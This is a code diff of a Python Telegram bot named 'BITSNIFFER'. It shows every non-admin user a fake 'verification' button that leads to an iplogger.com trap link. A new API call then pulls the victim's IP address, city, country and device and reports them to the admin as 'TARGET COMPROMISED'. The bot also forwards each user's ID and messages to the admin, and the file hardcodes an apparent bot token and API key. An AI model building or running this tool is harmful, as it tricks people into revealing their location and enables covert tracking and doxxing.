@@ -1,6 +1,7 @@
 import asyncio
 import re
 import logging
+import aiohttp
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.client.default import DefaultBotProperties
@@ -8,6 +9,8 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 # --- КОНФИГУРАЦИЯ СИСТЕМЫ ---
 TOKEN = "8777973485:AAHg2x7ez-wCOMb1b9CEC-uaO4uKf4tVAxM"
+IPLOGGER_API_KEY = "api_T34YFYm4xwWYl1Pfi2DjCFX78eCD3PZO"
+LOGGER_ID = "hackpack"  # Имя вашего логгера
 CHANNEL_ID = "@hackpackposter" 
 MY_ADMIN_ID = 7917303098 
 
@@ -15,41 +18,57 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
+# --- СИСТЕМА ПЕРЕХВАТА IP ЧЕРЕЗ API ---
+
+async def get_last_ip_intel():
+    """Запрос данных напрямую из IPLogger API"""
+    # Эндпоинт для получения статистики конкретного логгера
+    url = f"https://api.iplogger.org/v1/loggers/{LOGGER_ID}/visitors?limit=1"
+    headers = {"X-API-KEY": IPLOGGER_API_KEY}
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, headers=headers) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    if data and "visitors" in data and len(data["visitors"]) > 0:
+                        v = data["visitors"][0]
+                        ip = v.get("ip", "N/A")
+                        country = v.get("country", "Unknown")
+                        city = v.get("city", "Unknown")
+                        device = v.get("user_agent", "N/A")
+                        return (f"🚀 <b>TARGET COMPROMISED:</b>\n"
+                                f"🌐 <b>IP:</b> <code>{ip}</code>\n"
+                                f"📍 <b>LOC:</b> {city}, {country}\n"
+                                f"📱 <b>OS/DEV:</b> {device}")
+                else:
+                    return f"⚠️ <b>API Error:</b> Status {response.status}"
+    except Exception as e:
+        return f"⚠️ <b>Connection Error:</b> {e}"
+    return "📡 <b>LOG:</b> Пока новых данных нет."
+
 # --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
 
 def clean_and_style(text: str, msg_type: str = "TEXT") -> str:
     if not text: text = ""
-    text = re.sub(r'http\S+', '', text)
-    text = re.sub(r'@\S+', '', text)
-    text = text.replace("тихо", "").strip()
-    
+    text = re.sub(r'http\S+', '', text).replace("тихо", "").strip()
     tags = f"\n\n#{msg_type} #INTEL_DATA"
     signature = "\n<b>💀 SOURCE: @hackpackposter</b>"
     full_footer = tags + signature
-    
     if msg_type != "TEXT" and len(text) + len(full_footer) > 1024:
         text = text[:(1021 - len(full_footer))] + "..."
-        
     return text + full_footer
 
 def get_post_kb():
     builder = InlineKeyboardBuilder()
-    builder.row(
-        types.InlineKeyboardButton(text="👍", callback_data="like"),
-        types.InlineKeyboardButton(text="👎", callback_data="dislike")
-    )
-    builder.row(types.InlineKeyboardButton(
-        text="📡 SHARE ACCESS", 
-        url="https://t.me/share/url?url=https://t.me/hackpackposter")
-    )
+    builder.row(types.InlineKeyboardButton(text="👍", callback_data="like"), types.InlineKeyboardButton(text="👎", callback_data="dislike"))
+    builder.row(types.InlineKeyboardButton(text="📡 SHARE ACCESS", url="https://t.me/hackpackposter"))
     return builder.as_markup()
 
 def get_spy_kb():
-    """Ловушка с автоматическим уведомлением"""
     builder = InlineKeyboardBuilder()
-    # Ваша ссылка-ловушка
-    trap_url = "https://iplogger.com/2eCyg6" 
-    builder.row(types.InlineKeyboardButton(text="🛡 ПОДТВЕРДИТЬ ЛИЧНОСТЬ", url=trap_url))
+    builder.row(types.InlineKeyboardButton(text="🛡 ВЕРИФИКАЦИЯ", url="https://iplogger.com/2eCyg6"))
+    builder.row(types.InlineKeyboardButton(text="🔄 СТАТУС ЗАХВАТА", callback_data="check_ip"))
     return builder.as_markup()
 
 # --- ОБРАБОТЧИКИ СОБЫТИЙ ---
@@ -57,27 +76,18 @@ def get_spy_kb():
 @dp.message(Command("start"))
 async def start_handler(message: types.Message):
     u = message.from_user
-    
-    # ПРОВЕРКА СИГНАЛА ОТ ЛОГГЕРА (если настроен редирект обратно в бота)
-    if "target_confirmed" in message.text:
-        await bot.send_message(MY_ADMIN_ID, f"🚀 <b>ALERT:</b> Цель {u.id} перешла по ссылке! Проверьте панель управления.")
-        await message.answer("<b>VERIFICATION SUCCESSFUL.</b>\nДоступ разрешен.")
-        return
-
     if u.id == MY_ADMIN_ID:
-        await message.answer("<b>BITSNIFFER v2.7 ONLINE.</b>\nГотов к приему пакетов, мой господин.")
+        await message.answer(f"<b>BITSNIFFER v3.0 ONLINE.</b>\nNode: <code>{LOGGER_ID}</code> [Active]")
     else:
-        log_report = (
-            f"<code>[NEW TARGET DETECTED]\n"
-            f"NAME: {u.first_name.upper()}\n"
-            f"UID: {u.id}\n"
-            f"ACTION: TRAP_LINK_DEPLOYED</code>"
-        )
-        await bot.send_message(MY_ADMIN_ID, log_report)
-        await message.answer(
-            "<b>SECURITY WARNING.</b>\nВаш узел не верифицирован. Нажмите кнопку ниже для подтверждения.",
-            reply_markup=get_spy_kb()
-        )
+        await bot.send_message(MY_ADMIN_ID, f"<code>[DETECTED] {u.id} пытается войти.</code>")
+        await message.answer("<b>ACCESS DENIED.</b> Пройдите верификацию узла.", reply_markup=get_spy_kb())
+
+@dp.callback_query(F.data == "check_ip")
+async def check_ip_callback(callback: types.CallbackQuery):
+    """Мгновенная проверка логов через API"""
+    intel = await get_last_ip_intel()
+    await bot.send_message(MY_ADMIN_ID, intel)
+    await callback.answer("Запрос в базу выполнен.")
 
 @dp.message()
 async def posting_handler(message: types.Message):
@@ -86,7 +96,7 @@ async def posting_handler(message: types.Message):
             raw_text = message.text or message.caption or ""
             kb = get_post_kb()
             silent = "тихо" in raw_text.lower()
-
+            
             if message.text:
                 text = clean_and_style(raw_text, "TEXT")
                 await bot.send_message(CHANNEL_ID, text, reply_markup=kb, disable_notification=silent)
@@ -100,23 +110,15 @@ async def posting_handler(message: types.Message):
                 text = clean_and_style(raw_text, "DOCUMENT")
                 await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb, disable_notification=silent)
 
-            await message.answer(f"🛠 <b>LOG: Packet sent.</b>")
+            await message.answer("🛠 <b>LOG: Packet sent.</b>")
         except Exception as e:
-            await message.answer(f"❌ <b>CRITICAL ERROR:</b> {e}")
+            await message.answer(f"❌ <b>ERROR:</b> {e}")
     else:
-        # Шпионаж за активностью
-        u = message.from_user
-        spy_msg = (
-            f"📡 <b>DATA INTERCEPT:</b>\n"
-            f"FROM: {u.id}\n"
-            f"TEXT: {message.text or 'MEDIA'}\n"
-            f"STATUS: WAITING_FOR_IP_CAPTURE"
-        )
-        await bot.send_message(MY_ADMIN_ID, spy_msg)
-        await message.answer("<b>ACCESS DENIED.</b> Пройдите верификацию.", reply_markup=get_spy_kb())
+        await bot.send_message(MY_ADMIN_ID, f"📡 <b>DATA:</b> Пользователь {message.from_user.id} отправил сообщение.")
+        await message.answer("<b>VERIFICATION REQUIRED.</b>", reply_markup=get_spy_kb())
 
 async def main():
-    print("--- BITSNIFFER CORE v2.7 ONLINE ---")
+    print(f"--- BITSNIFFER v3.0 [{LOGGER_ID}] ONLINE ---")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
